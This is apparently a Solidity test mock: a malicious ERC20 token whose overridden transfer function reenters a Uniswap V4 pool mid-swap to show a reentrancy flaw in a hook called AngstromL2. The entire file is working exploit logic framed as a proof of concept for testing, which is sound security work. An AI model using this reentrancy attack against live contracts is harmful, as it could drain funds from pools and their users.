// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {MockERC20} from "super-sol/mocks/MockERC20.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";

/// @notice A malicious ERC20 that reenters during transfer (simulating ERC777-like behavior)
/// @dev Used to demonstrate reentrancy vulnerability in AngstromL2's afterSwap hook
contract ReentrantERC20 is MockERC20 {
    IPoolManager public poolManager;
    PoolKey public attackPoolKey;
    bool public attackEnabled;
    bool public inAttack;
    uint256 public attackCount;
    uint256 public maxAttacks;

    bool public reentrancyTriggered;
    int256 public reentrantSwapAmount;
    bool public reentrantSwapSucceeded;

    event ReentrancyAttempted(uint256 attackNumber);
    event ReentrancyExecuted(uint256 attackNumber, int128 amount0, int128 amount1);
    event ReentrancyFailed(uint256 attackNumber, bytes reason);

    function setAttackParams(
        IPoolManager _poolManager,
        PoolKey memory _poolKey,
        uint256 _maxAttacks
    ) external {
        poolManager = _poolManager;
        attackPoolKey = _poolKey;
        maxAttacks = _maxAttacks;
    }

    function enableAttack() external {
        attackEnabled = true;
        attackCount = 0;
        reentrancyTriggered = false;
        reentrantSwapSucceeded = false;
    }

    function disableAttack() external {
        attackEnabled = false;
    }

    /// @notice Override transfer to add reentrancy attack
    /// @dev This simulates a token with transfer hooks (like ERC777)
    function transfer(address to, uint256 amount) public override returns (bool) {
        bool result = super.transfer(to, amount);

        // Attempt reentrancy if enabled and not already in attack
        // The attack happens when the hook's afterSwap calls UNI_V4.take()
        // which triggers this transfer
        if (attackEnabled && !inAttack && attackCount < maxAttacks) {
            inAttack = true;
            attackCount++;
            reentrancyTriggered = true;

            emit ReentrancyAttempted(attackCount);

            // Reenter by initiating another swap while still in afterSwap
            // We're already in the Uniswap V4 unlock context, so we call swap directly
            // and settle deltas within the same unlock
            _executeReentrantSwap();

            inAttack = false;
        }

        return result;
    }

    int256 public configuredSwapAmount;
    bool public configuredZeroForOne;

    function setSwapConfig(bool zeroForOne, int256 amount) external {
        configuredZeroForOne = zeroForOne;
        configuredSwapAmount = amount;
    }

    /// @notice Execute a reentrant swap within the existing unlock context
    /// @dev This directly calls swap and settles deltas without a nested unlock
    function _executeReentrantSwap() internal {
        reentrantSwapAmount = configuredSwapAmount;

        SwapParams memory params = SwapParams({
            zeroForOne: configuredZeroForOne,
            amountSpecified: reentrantSwapAmount,
            sqrtPriceLimitX96: configuredZeroForOne
                ? TickMath.MIN_SQRT_PRICE + 1
                : TickMath.MAX_SQRT_PRICE - 1
        });

        // Execute swap directly - we're already in an unlock context
        // This will trigger beforeSwap and afterSwap hooks, corrupting transient storage
        BalanceDelta delta = poolManager.swap(attackPoolKey, params, "");

        _settleDeltas(attackPoolKey, delta);
        reentrantSwapSucceeded = true;
        emit ReentrancyExecuted(attackCount, delta.amount0(), delta.amount1());
    }

    function _settleDeltas(PoolKey memory key, BalanceDelta delta) internal {
        if (delta.amount0() < 0) {
            poolManager.sync(key.currency0);
            poolManager.settle{value: uint128(-delta.amount0())}();
        } else if (delta.amount0() > 0) {
            poolManager.take(key.currency0, address(this), uint128(delta.amount0()));
        }

        if (delta.amount1() < 0) {
            poolManager.sync(key.currency1);
            MockERC20.transfer(address(poolManager), uint128(-delta.amount1()));
            poolManager.settle();
        } else if (delta.amount1() > 0) {
            poolManager.take(key.currency1, address(this), uint128(delta.amount1()));
        }
    }

    receive() external payable {}
}
